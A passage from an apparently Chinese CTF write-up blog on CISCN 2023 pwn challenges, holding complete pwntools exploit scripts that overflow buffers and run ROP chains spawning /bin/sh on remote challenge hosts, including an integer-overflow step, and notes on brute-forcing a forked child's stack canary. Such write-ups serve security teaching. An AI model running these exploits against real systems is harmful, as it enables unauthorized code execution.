class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000474c00</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040139c</span>) <span class="hljs-comment"># syscall</span><br></code></pre></td></tr></table></figure>

<p>很可惜，这段 ropchain 还是太长了，还需要缩短，最后结果 exp 如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28324</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./easy_pwn&#x27;</span>)<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment"># Padding goes here</span><br>p = <span class="hljs-string">b&#x27;&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004040fe</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006ba0e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000449b9c</span>) <span class="hljs-comment"># pop rax ; ret</span><br>p += <span class="hljs-string">b&#x27;/bin//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000047f7b1</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004040fe</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006ba0e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000444f00</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000047f7b1</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004006e6</span>) <span class="hljs-comment"># pop rdi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006ba0e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004040fe</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006ba0e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000449bf5</span>) <span class="hljs-comment"># pop rdx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000006ba0e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000444f00</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000449b9c</span>) <span class="hljs-comment"># pop rax ; ret</span><br>p += p64(<span class="hljs-number">59</span>)<br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040139c</span>) <span class="hljs-comment"># syscall</span><br>ep = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(p)):<br>        ep += p8(<span class="hljs-built_in">ord</span>(p[i:i+<span class="hljs-number">1</span>]) ^ <span class="hljs-number">0x66</span>)<br>    <br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span> + ep<br>io.sendafter(<span class="hljs-string">b&#x27;Password: \n&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="CISCN-2023-华南-烧烤摊儿"><a href="#CISCN-2023-华南-烧烤摊儿" class="headerlink" title="[CISCN 2023 华南] 烧烤摊儿"></a>[CISCN 2023 华南] 烧烤摊儿</h3><h4 id="题目说明-21"><a href="#题目说明-21" class="headerlink" title="题目说明"></a>题目说明</h4><p>整数溢出把摊买下来，改名儿的时候存在溢出，静态链接用 ROPgadget 生成 ropchain</p>
<h4 id="解题思路-20"><a href="#解题思路-20" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./shaokao&#x27;</span>)<br><span class="hljs-comment">#io = process(&#x27;./shaokao&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;39.106.71.184&#x27;</span>,<span class="hljs-number">34604</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a,b</span>):<br>    io.sendlineafter(a,b)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>():<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    sla(<span class="hljs-string">&quot;3. 勇闯天涯&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    sla(<span class="hljs-string">&quot;来几瓶？&quot;</span>,<span class="hljs-string">&quot;-114514&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cancan</span>():<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vip</span>():<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">play</span>(<span class="hljs-params">data</span>):<br>    sla(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;5&quot;</span>)<br>    sla(<span class="hljs-string">&quot;烧烤摊儿已归你所有，请赐名：&quot;</span>,data)<br><br>cancan()<br>buy()<br>cancan()<br>vip()<br><br><span class="hljs-comment">#ROPgadget --binary shaokao --ropchain</span><br><br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment"># Padding goes here</span><br>p = <span class="hljs-string">b&#x27;&#x27;</span><br><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a67e</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000458827</span>) <span class="hljs-comment"># pop rax ; ret</span><br>p += <span class="hljs-string">b&#x27;/bin//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000045af95</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a67e</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000447339</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000045af95</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040264f</span>) <span class="hljs-comment"># pop rdi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a67e</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004a404b</span>) <span class="hljs-comment"># pop rdx ; pop rbx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x4141414141414141</span>) <span class="hljs-comment"># padding</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000447339</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000402404</span>) <span class="hljs-comment"># syscall</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p<br>play(payload)<br>   <br>io.interactive()<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/2024/03/15/MyS3andB0x/KVI8btMX5oRGgrxXJeuclRvAni1.png'><img src="/2024/03/15/MyS3andB0x/KVI8btMX5oRGgrxXJeuclRvAni1.png"></p>
<h3 id="CISCN-2023-华南-funcanary"><a href="#CISCN-2023-华南-funcanary" class="headerlink" title="[CISCN 2023 华南]funcanary"></a>[CISCN 2023 华南]funcanary</h3><h4 id="题目说明-22"><a href="#题目说明-22" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-21"><a href="#解题思路-21" class="headerlink" title="解题思路"></a>解题思路</h4><p>保护全开，吓人吧</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/J6x5bvqrmo0tD7xfq2icyjHmn8M.png'><img src="/2024/03/15/MyS3andB0x/J6x5bvqrmo0tD7xfq2icyjHmn8M.png"></p>
<p>Cancanneed main 函数</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/UTsab9NvKoavA9xFKYUcdLaGnII.png'><img src="/2024/03/15/MyS3andB0x/UTsab9NvKoavA9xFKYUcdLaGnII.png"></p>
<p>重头戏在 fork 函数，每次循环它都会开出一个子进程（sub_128A），子进程中存在溢出。特别的，子进程的 canary 是不变的。我们可以利用这些特性对 canary 地址进行爆破</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/NfzUbUSaeo6DeIxrXZvcDabLns4.png'><img src="/2024/03/15/MyS3andB0x/NfzUbUSaeo6DeIxrXZvcDabLns4.png"></p>
<p>看汇编还找到个后门函数，比赛时只看到了字符串没找到这个地方</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/Hx8BbummcoRprfxllX3cHOSanFc.png'><img src="/2024/03/15/MyS3andB0x/Hx8BbummcoRprfxllX3cHOSanFc.png"></p>
<p>程序开启了 PIE 保护，canary 后三位固定，爆破 canary 第四位地址即可</p>
